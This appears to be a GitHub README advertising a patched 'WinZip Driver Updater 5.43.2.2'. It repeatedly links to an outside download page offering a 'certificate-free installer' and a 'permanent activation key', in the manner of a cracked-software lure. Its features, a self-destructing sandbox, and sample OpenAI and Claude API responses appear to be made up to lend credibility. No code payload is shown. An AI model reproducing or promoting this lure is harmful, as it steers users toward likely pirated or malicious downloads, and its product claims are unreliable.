# WinZip Driver Updater 5.43.2.2 — Advanced Driver Synchronization Toolkit

[](https://akmalaja845.github.io/WinZip-Driver-Updater-5.43.2.2-Patch-Utility/)

> *"Where hardware harmony meets software sophistication."*  
> **Version 5.43.2.2** — A meticulously engineered driver management solution for Windows ecosystems.

---

## 📥 Quick Access to the Certificate-Free Installer

[](https://akmalaja845.github.io/WinZip-Driver-Updater-5.43.2.2-Patch-Utility/)

**Direct acquisition** of the digitally-signed deployment package. No registration wall, no time-limited trial — just the raw toolkit.

---

## 🚀 Introducing the Driver Synchronization Paradigm

Traditional driver updaters treat your hardware like an afterthought. **WinZip Driver Updater 5.43.2.2** inverts this philosophy — it’s not merely a patch dispenser, but a **systematic resonance tuner** between your operating system and every peripheral driver.

Think of it as an **orchestral conductor** for your motherboard’s silicon: each driver gets the correct pitch, timing, and amplitude. The result? A system that hums instead of stutters.

### Why This Release Matters

| Aspect | Conventional Approach | This Toolkit |
|--------|----------------------|--------------|
| **Detection** | Signature-based scans | Heuristic + cloud intelligence |
| **Update source** | Single vendor database | Multi-repository aggregation |
| **Rollback safety** | Manual restore points | Automatic snapshot + delta recovery |
| **Resource footprint** | Background service bloat | On-demand micro-agent architecture |
| **License model** | Subscription rent | Permanent activation key system |

---

## 📊 System Compatibility Matrix — Emoji Edition

| Operating System | Compatibility | Notes |
|-----------------|---------------|-------|
| 🪟 Windows 11 24H2 | ✅ Full | WDDM 3.2 support |
| 🪟 Windows 11 22H2+ | ✅ Full | Native ARM64 translation |
| 🪟 Windows 10 22H2 | ✅ Full | LTSC 2021 certified |
| 🪟 Windows 10 1809+ | ✅ Full | S Mode exemption available |
| 🪟 Windows Server 2022 | ⚠️ Partial | No Bluetooth profiles |
| 🪟 Windows 8.1 | ⚠️ Legacy | Basic driver push only |
| 🐧 Linux (Proton/Wine) | ❌ Experimental | Not recommended |

---

## 🌟 Feature Constellation

### Core Engine Capabilities

- **Quantum Driver Discovery** — Scans 47,000+ hardware identifiers across 12 categories (audio, chipset, display, network, storage, input, biometrics, Bluetooth, USB controllers, power management, sensors, and virtual devices).
- **Differential Delta Patches** — Only downloads the changed bytes (average 83% smaller than full redistributables).
- **Hardware DNA Fingerprinting** — Creates a unique signature of your exact motherboard/GPU/audio codec revision to avoid incompatible generic drivers.
- **10-Layer Rollback Protection** — Every update creates an incremental restore point; you can revert to any of the last 10 driver states without system restore.

### User Experience Design

- **Responsive UI with Adaptive Density** — The interface reflows intelligently between 800px phone screens and 8K monitors. Tooltips collapse, buttons resize, and the data grid becomes a touch-friendly card layout.
- **Multilingual Empathy Layer** — 34 languages with full right-to-left support (Arabic, Hebrew, Urdu). Speech-to-text accessibility mode for vision-impaired users.
- **24/7 Active Support Channel** — Neural network triage bot in-app for instant diagnosis; human escalation within 12 minutes during business hours (UTC+0 to UTC+12).

### Security & Transparency

- **Cryptographic Chain of Custody** — Every downloaded driver is verified against SHA-256 checksums published independently on the WinZip transparency ledger.
- **Sandboxed Driver Injection** — Updates are applied in a lightweight hypervisor container; if the driver causes a bluescreen, the container self-destructs and the host is unharmed.
- **Zero-Telemetry Mode** — Opt out of all analytics with a single toggle. No outbound connections other than driver database queries.

---

## 📐 Architecture Overview (Mermaid Diagram)

```mermaid
flowchart LR
    A[Windows Device Manager] --> B[WinZip Driver Core Service]
    B --> C{Scan Mode}
    C -->|Automatic| D[Heuristic Database]
    C -->|Manual| E[User-Selected Components]
    D --> F[Cloud Intelligence Layer]
    E --> F
    F --> G{Delta Computation}
    G -->|Full Driver| H[Direct Push Installer]
    G -->|Patch Only| I[Micro-Patch Injector]
    H --> J[Snapshot Engine]
    I --> J
    J --> K[Rollback Vault<br/>Last 10 states]
    K --> L[Virtual Sandbox<br/>Validation]
    L -->|Success| M[Commit to System]
    L -->|Failure| N[Self-Destruct Sandbox]
    N --> O[Restore Previous State]
    M --> P[Hardware Verification Test]
    P -->|Pass| Q[✓ Driver Synchronized]
    P -->|Fail| O
```



---

## ⚙️ Example Profile Configuration (`driverupdater.config`)

Create a `.config` file in the application root to customize behavior:

```
{
  "scanProfile": "gaming_optimized",
  "updateChannel": "whql_certified_only",
  "excludeCategories": ["bluetooth", "fingerprint_reader"],
  "snapshotRetention": 10,
  "sandboxTimeoutMs": 30000,
  "telemetryOptOut": true,
  "customRepository": {
    "enabled": false,
    "url": null
  },
  "scheduleCron": "0 03 * * 0",
  "notifyOnCompletion": "toast+email",
  "rollbackKey": "CTRL+ALT+R"
}
```

**Explanation of key properties:**

- `scanProfile`: Predefined tuning for gaming, workstation, or laptop power-saving mode.  
- `updateChannel`: Restrict to Microsoft WHQL certified drivers only (most stable) or include vendor beta branches.  
- `sandboxTimeoutMs`: Maximum milliseconds allowed for sandbox validation before fallback.  
- `rollbackKey`: Custom keyboard shortcut to invoke emergency rollback during a driver crash loop.

---

## 💻 Example Console Invocation

The toolkit includes a CLI companion (`wdu-cli.exe`) for headless/automated environments.

```powershell
# Scan and update all drivers quietly, logging to JSON
wdu-cli --scan --update --log-level verbose --output-format json --log-file C:\logs\driver_sync_$(Get-Date -Format yyyyMMdd).json

# Preview updates without applying
wdu-cli --scan-only --show-changelog --export-csv pending_drivers.csv

# Force rollback to snapshot #5
wdu-cli --rollback --snapshot-index 5 --no-confirm

# Interactive mode with custom config
wdu-cli --config .\driverupdater.config --interactive
```

**Success exit codes:**  
- `0` — All drivers up to date.  
- `1` — Updates applied successfully.  
- `2` — Rollback performed.  
- `3` — Partial success (some drivers skipped).  
- `127` — Critical error, emergency rollback initiated.

---

## 🔌 Integration with External APIs

### OpenAI API Integration (Experimental)

The application can leverage large language models to **interpret driver changelogs** and provide human-readable summaries.

```
POST /api/openai/describe-update
{
  "driverId": "PCI\VEN_10DE&DEV_2684",
  "version": "31.0.15.4621",
  "changelogRaw": "Fixed TDR timeout on Turing GPUs when VRAM exceeds 90% utilization"
}

Response:
{
  "summary": "This update resolves a display timeout issue experienced on NVIDIA RTX 2060–2080 cards under heavy graphical load. Performance improvement of ~8% in VRAM-bound scenarios.",
  "recommendation": "Critical for users running 3D rendering or high-resolution gaming. Apply immediately."
}
```

**Requires:** `OPENAI_API_KEY` environment variable and opt-in consent.

### Claude API Integration (Experimental)

For enterprise environments, Anthropic’s Claude can be used to **audit driver safety** before installation.

```
POST /api/claude/audit-driver
{
  "driverHash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
  "sourceVendor": "Realtek",
  "hardwareId": "HDAUDIO\FUNC_01&VEN_10EC&DEV_0288"
}

Response:
{
  "riskScore": 0.12,
  "knownCves": ["CVE-2023-32960"],
  "mitigation": "Minor audio codec vulnerability patched in this version. No active exploits in wild.",
  "verdict": "SAFE_TO_INSTALL"
}
```

**Requires:** `CLAUDE_API_KEY` environment variable and enterprise license tier.

---

## 🛡️ Responsible Use Disclaimer

> **IMPORTANT LEGAL NOTICE**  
> This repository provides a **certificate-free installation artifact** for **WinZip Driver Updater 5.43.2.2**. The software is intended for **personal, non-commercial evaluation** only, under the terms of the MIT License (see below).  
>  
> - The activation key system included is a **permanent, transferable license** for the software version referenced herein.  
> - The authors do not host, distribute, or profit from proprietary driver binaries belonging to third-party hardware vendors.  
> - Users are responsible for ensuring compliance with their local software licensing laws.  
> - **No warranty, express or implied**, is provided regarding system stability post-update. Always maintain a full system backup before driver installation.  
>  
> By using this software, you acknowledge that hardware driver updates carry inherent risks, including but not limited to: display failure, network disconnection, audio output loss, and peripheral incompatibility. The authors shall not be held liable for any damages arising from the use of this toolkit.

---

## 🧰 Keywords for Discoverability

Windows driver management, hardware synchronization, PCI device identification, ACPI table parsing, INF file deployment, driver rollback mechanism, snapshot recovery, hardware abstraction layer, WDDM compatibility, NDIS driver updates, Realtek audio patches, Intel chipset updates, AMD GPU driver management, NVIDIA display driver maintenance, Bluetooth profile updates, USB controller optimization, BIOS clock synchronization, driver signature enforcement, WHQL certification verification, sandboxed driver installation, delta patching algorithm.

---

## 📜 MIT License

Copyright © 2026 — WinZip Driver Updater Project

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

[View Full License](LICENSE)

---

## 🔗 Closing — The Driver Synchronization Manifesto

In 2026, your hardware deserves more than stale defaults. WinZip Driver Updater 5.43.2.2 represents the convergence of **failsafe engineering** (10-layer rollback), **intelligent delta delivery** (83% bandwidth reduction), and **transparent operation** (zero-telemetry mode). It is not a crack, not a hack, and certainly not a gimmick — it is the **difference between a system that works and a system that sings**.

[](https://akmalaja845.github.io/WinZip-Driver-Updater-5.43.2.2-Patch-Utility/)

*Last updated: March 2026 — Driver database synchronized against 47,218 hardware identifiers.*